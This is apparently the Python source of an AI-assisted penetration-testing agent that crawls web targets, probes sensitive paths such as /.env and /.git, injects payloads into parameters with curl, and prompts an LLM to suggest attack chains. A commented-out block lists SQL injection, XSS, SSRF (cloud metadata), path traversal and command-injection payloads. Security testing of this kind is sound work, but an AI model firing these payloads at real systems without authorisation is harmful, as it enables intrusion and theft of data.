"""AI-driven vulnerability reasoning activities for Major-Project agent."""
import asyncio
import json
import re
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse, parse_qs

from temporalio import activity

from agentex.lib.utils.logging import make_logger

logger = make_logger(__name__)


# Vulnerability patterns that AI should look for
VULNERABILITY_INDICATORS = {
    "sqli": {
        "param_patterns": ["id", "user_id", "product_id", "category", "order", "sort", "search", "query", "q"],
        "response_patterns": ["sql", "mysql", "sqlite", "postgres", "oracle", "syntax error", "unterminated"],
    },
    "xss": {
        "param_patterns": ["search", "q", "query", "name", "message", "comment", "callback", "redirect", "url"],
        "response_patterns": ["<script", "onerror", "onload", "javascript:"],
    },
    "ssrf": {
        "param_patterns": ["url", "uri", "path", "dest", "redirect", "callback", "return", "next", "target", "link"],
        "response_patterns": ["connection refused", "timeout", "localhost", "127.0.0.1", "internal"],
    },
    "idor": {
        "param_patterns": ["id", "user_id", "account", "order_id", "doc", "file_id", "profile"],
        "response_patterns": [],  # Requires comparing responses between IDs
    },
    "path_traversal": {
        "param_patterns": ["file", "path", "document", "folder", "dir", "template", "page", "include"],
        "response_patterns": ["root:", "/etc/passwd", "boot.ini", "win.ini"],
    },
    "command_injection": {
        "param_patterns": ["cmd", "exec", "command", "ping", "host", "ip", "query"],
        "response_patterns": ["uid=", "root", "bin/bash", "command not found"],
    },
}


@activity.defn(name="crawl_application_activity")
async def crawl_application_activity(
    target_url: str, task_id: str, trace_id: str
) -> Dict[str, Any]:
    """
    Crawl application to discover endpoints, parameters, and forms.

    Returns structured data for AI analysis.
    """
    logger.info(f"Crawling application: {target_url}")

    try:
        import subprocess
        import tempfile

        # Use katana for crawling (fast, headless crawler)
        output_file = tempfile.mktemp(suffix='.json')

        cmd = [
            "katana",
            "-u", target_url,
            "-d", "3",  # Depth
            "-jc",  # JavaScript crawling
            "-json",
            "-o", output_file,
            "-silent",
            "-timeout", "30",
            "-rate-limit", "50",
        ]

        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        await process.communicate()

        endpoints = []
        forms = []
        parameters = set()

        # Parse katana output
        try:
            with open(output_file, 'r') as f:
                for line in f:
                    if line.strip():
                        try:
                            result = json.loads(line)
                            url = result.get('request', {}).get('endpoint', '')
                            method = result.get('request', {}).get('method', 'GET')

                            if url:
                                endpoints.append({
                                    "url": url,
                                    "method": method,
                                    "source": result.get('request', {}).get('source', ''),
                                })

                                # Extract parameters from URL
                                parsed = urlparse(url)
                                params = parse_qs(parsed.query)
                                for param in params.keys():
                                    parameters.add(param)

                        except json.JSONDecodeError:
                            continue
        except FileNotFoundError:
            logger.warning("Katana output file not found, using fallback discovery")

        # Fallback: basic HTTP probing if katana didn't find much
        if len(endpoints) < 5:
            logger.info("Running fallback endpoint discovery with httpx")

            # Common API/Web paths to probe
            common_paths = [
                "/", "/api", "/api/v1", "/api/v2", "/login", "/register", "/admin",
                "/user", "/users", "/profile", "/account", "/search", "/products",
                "/cart", "/checkout", "/orders", "/api/users", "/api/products",
                "/rest", "/graphql", "/swagger", "/docs", "/health", "/status",
                "/.git", "/.env", "/config", "/backup", "/robots.txt", "/sitemap.xml",
            ]

            for path in common_paths:
                test_url = f"{target_url.rstrip('/')}{path}"
                try:
                    probe_cmd = ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "-m", "3", test_url]
                    proc = await asyncio.create_subprocess_exec(
                        *probe_cmd,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE
                    )
                    stdout, _ = await proc.communicate()
                    status = stdout.decode().strip()

                    if status and status not in ["000", "404", "403"]:
                        endpoints.append({
                            "url": test_url,
                            "method": "GET",
                            "status": int(status),
                            "source": "probe",
                        })
                except Exception as e:
                    continue

        result = {
            "target": target_url,
            "endpoints": endpoints[:100],  # Limit
            "forms": forms,
            "parameters": list(parameters),
            "endpoint_count": len(endpoints),
        }

        logger.info(f"Crawl complete: {len(endpoints)} endpoints, {len(parameters)} unique parameters")
        return result

    except Exception as e:
        logger.error(f"Crawl failed: {e}")
        return {
            "target": target_url,
            "endpoints": [],
            "forms": [],
            "parameters": [],
            "error": str(e),
        }


@activity.defn(name="analyze_endpoint_for_vulnerabilities_activity")
async def analyze_endpoint_for_vulnerabilities_activity(
    endpoint: Dict[str, Any],
    response_sample: Optional[str],
    task_id: str,
    trace_id: str
) -> Dict[str, Any]:
    """
    Use AI reasoning to analyze an endpoint for potential vulnerabilities.

    This is where the actual AI reasoning happens - analyzing:
    - Parameter names and their likely purpose
    - Response content for vulnerability indicators
    - Application behavior patterns
    """
    logger.info(f"Analyzing endpoint: {endpoint.get('url', 'unknown')}")

    url = endpoint.get('url', '')
    method = endpoint.get('method', 'GET')

    potential_vulns = []

    # Parse URL for parameters
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    path = parsed.path

    # AI-like reasoning about parameters
    for param_name, param_values in params.items():
        param_lower = param_name.lower()

        # Check each vulnerability type
        for vuln_type, indicators in VULNERABILITY_INDICATORS.items():
            for pattern in indicators["param_patterns"]:
                if pattern in param_lower:
                    potential_vulns.append({
                        "type": vuln_type,
                        "parameter": param_name,
                        "url": url,
                        "confidence": "medium",
                        "reasoning": f"Parameter '{param_name}' matches pattern '{pattern}' commonly associated with {vuln_type}",
                        "suggested_payloads": generate_payloads_for_vuln(vuln_type, param_name),
                    })
                    break

    # Analyze path for potential vulnerabilities
    path_parts = path.split('/')
    for i, part in enumerate(path_parts):
        # Check for numeric IDs in path (potential IDOR)
        if part.isdigit():
            potential_vulns.append({
                "type": "idor",
                "parameter": f"path_segment_{i}",
                "url": url,
                "confidence": "medium",
                "reasoning": f"Numeric ID '{part}' in URL path suggests potential IDOR vulnerability",
                "suggested_payloads": [
                    url.replace(f"/{part}/", "/1/"),
                    url.replace(f"/{part}/", "/0/"),
                    url.replace(f"/{part}/", "/-1/"),
                    url.replace(f"/{part}", f"/{int(part)+1}"),
                ],
            })

    # Analyze response content if available
    if response_sample:
        response_lower = response_sample.lower()

        # Check for information disclosure
        sensitive_patterns = [
            ("api_key", "API key exposure"),
            ("password", "Password in response"),
            ("secret", "Secret value exposure"),
            ("token", "Token exposure"),
            ("stack trace", "Stack trace disclosure"),
            ("exception", "Exception details exposure"),
            ("debug", "Debug information exposure"),
        ]

        for pattern, description in sensitive_patterns:
            if pattern in response_lower:
                potential_vulns.append({
                    "type": "information_disclosure",
                    "url": url,
                    "confidence": "high",
                    "reasoning": description,
                    "evidence": f"Found '{pattern}' in response",
                })

    return {
        "endpoint": url,
        "method": method,
        "potential_vulnerabilities": potential_vulns,
        "parameters_analyzed": list(params.keys()),
    }


def generate_payloads_for_vuln(vuln_type: str, param_name: str) -> List[str]:
    """Generate context-aware payloads for a vulnerability type.

    NOTE: Hardcoded payloads have been commented out.
    Use LLM-based payload generation from creative_payload_generation.py instead.
    """
    # HARDCODED PAYLOADS COMMENTED OUT - Use LLM generation instead
    # payloads = {
    #     "sqli": [
    #         "' OR '1'='1",
    #         "' OR '1'='1' --",
    #         "1' AND '1'='1",
    #         "1 UNION SELECT NULL--",
    #         "1' UNION SELECT NULL,NULL--",
    #         "'; DROP TABLE users--",
    #         "1 AND 1=1",
    #         "1 AND 1=2",
    #         "' AND '1'='1' AND ''='",
    #         "1' ORDER BY 1--",
    #         "1' ORDER BY 10--",
    #     ],
    #     "xss": [
    #         "<script>alert('XSS')</script>",
    #         "<img src=x onerror=alert('XSS')>",
    #         "javascript:alert('XSS')",
    #         "<svg onload=alert('XSS')>",
    #         "'-alert('XSS')-'",
    #         "\"><script>alert('XSS')</script>",
    #         "{{constructor.constructor('alert(1)')()}}",  # Template injection
    #         "${alert('XSS')}",  # Template literal
    #         "<body onload=alert('XSS')>",
    #     ],
    #     "ssrf": [
    #         "http://localhost/",
    #         "http://127.0.0.1/",
    #         "http://[::1]/",
    #         "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    #         "http://metadata.google.internal/",  # GCP metadata
    #         "file:///etc/passwd",
    #         "dict://localhost:6379/info",  # Redis
    #         "gopher://localhost:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a",
    #     ],
    #     "idor": [
    #         "0", "1", "-1", "99999", "admin", "null", "undefined",
    #     ],
    #     "path_traversal": [
    #         "../../../etc/passwd",
    #         "....//....//....//etc/passwd",
    #         "..%2f..%2f..%2fetc/passwd",
    #         "..%252f..%252f..%252fetc/passwd",
    #         "/etc/passwd",
    #         "....\\....\\....\\windows\\win.ini",
    #     ],
    #     "command_injection": [
    #         "; id",
    #         "| id",
    #         "& id",
    #         "`id`",
    #         "$(id)",
    #         "; cat /etc/passwd",
    #         "| cat /etc/passwd",
    #         "&& whoami",
    #     ],
    # }

    # return payloads.get(vuln_type, [])

    # Return empty list - LLM should be used for payload generation
    logger.warning(f"generate_payloads_for_vuln called for '{vuln_type}' on param '{param_name}' - Use LLM-based generation instead")
    return []


@activity.defn(name="test_vulnerability_activity")
async def test_vulnerability_activity(
    target_url: str,
    parameter: str,
    payload: str,
    vuln_type: str,
    task_id: str,
    trace_id: str
) -> Dict[str, Any]:
    """
    Test a specific vulnerability by sending a payload and analyzing the response.
    """
    logger.info(f"Testing {vuln_type} on {parameter} with payload: {payload[:50]}...")

    try:
        import subprocess
        from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

        # Inject payload into parameter
        parsed = urlparse(target_url)
        params = parse_qs(parsed.query)
        params[parameter] = [payload]

        new_query = urlencode(params, doseq=True)
        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))

        # Send request and capture response
        cmd = [
            "curl", "-s", "-i",
            "-m", "10",
            "-H", "User-Agent: Mozilla/5.0 (Security Research)",
            test_url
        ]

        process = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        stdout, stderr = await process.communicate()
        response = stdout.decode(errors='ignore')

        # Analyze response for vulnerability confirmation
        confirmed = False
        evidence = []

        # Check vulnerability-specific indicators
        indicators = VULNERABILITY_INDICATORS.get(vuln_type, {}).get("response_patterns", [])

        response_lower = response.lower()
        for indicator in indicators:
            if indicator.lower() in response_lower:
                confirmed = True
                evidence.append(f"Found indicator: {indicator}")

        # Check for payload reflection (XSS)
        if vuln_type == "xss" and payload in response:
            confirmed = True
            evidence.append("Payload reflected in response without encoding")

        # Check for SQL errors
        if vuln_type == "sqli":
            sql_errors = ["sql syntax", "mysql", "sqlite", "postgresql", "ora-", "sql server"]
            for err in sql_errors:
                if err in response_lower:
                    confirmed = True
                    evidence.append(f"SQL error detected: {err}")

        return {
            "url": test_url,
            "parameter": parameter,
            "payload": payload,
            "vuln_type": vuln_type,
            "confirmed": confirmed,
            "evidence": evidence,
            "response_length": len(response),
            "response_sample": response[:500] if confirmed else None,
        }

    except Exception as e:
        logger.error(f"Vulnerability test failed: {e}")
        return {
            "url": target_url,
            "parameter": parameter,
            "payload": payload,
            "vuln_type": vuln_type,
            "confirmed": False,
            "error": str(e),
        }


@activity.defn(name="ai_reason_about_findings_activity")
async def ai_reason_about_findings_activity(
    findings: List[Dict[str, Any]],
    target_context: Dict[str, Any],
    task_id: str,
    trace_id: str
) -> Dict[str, Any]:
    """
    Use LLM to reason about findings and generate a comprehensive analysis.

    This activity uses the OpenAI SDK to call the LLM for:
    1. Analyzing confirmed vulnerabilities
    2. Suggesting exploitation chains
    3. Recommending remediation
    4. Identifying additional attack vectors
    """
    logger.info(f"AI reasoning about {len(findings)} findings")

    try:
        import os
        from openai import AsyncOpenAI

        # Prepare findings summary for LLM
        findings_text = json.dumps(findings[:20], indent=2)  # Limit to 20 findings

        prompt = f"""You are an expert penetration tester analyzing security findings.

Target: {target_context.get('target', 'Unknown')}
Technologies detected: {target_context.get('technologies', [])}

Findings to analyze:
{findings_text}

Please provide:
1. **Critical Vulnerabilities**: Which findings are most critical and why?
2. **Attack Chains**: Can any vulnerabilities be chained together for greater impact?
3. **Additional Tests**: What additional tests should be performed based on these findings?
4. **Business Impact**: What is the potential business impact of these vulnerabilities?
5. **Remediation Priority**: Which issues should be fixed first?

Be specific and actionable in your analysis."""

        # Initialize OpenAI SDK client with configured settings
        api_key = os.environ.get("OPENAI_API_KEY")
        base_url = os.environ.get("OPENAI_BASE_URL", "https://api.openai.com/v1")
        model = os.environ.get("OPENAI_MODEL", "gpt-4")

        if not api_key:
            logger.warning("No OPENAI_API_KEY set, skipping AI reasoning")
            return {
                "analysis": "AI reasoning skipped - no API key configured",
                "findings_count": len(findings),
            }

        # Use OpenAI SDK for the LLM call
        client = AsyncOpenAI(
            api_key=api_key,
            base_url=base_url,
        )

        response = await client.chat.completions.create(
            model=model,
            messages=[
                {"role": "system", "content": "You are an expert penetration tester providing security analysis."},
                {"role": "user", "content": prompt},
            ],
            temperature=0.3,
            max_tokens=2000,
        )

        analysis = response.choices[0].message.content

        return {
            "analysis": analysis,
            "findings_count": len(findings),
            "model_used": model,
        }

    except Exception as e:
        logger.error(f"AI reasoning failed: {e}")
        return {
            "analysis": f"AI reasoning failed: {str(e)}",
            "findings_count": len(findings),
        }
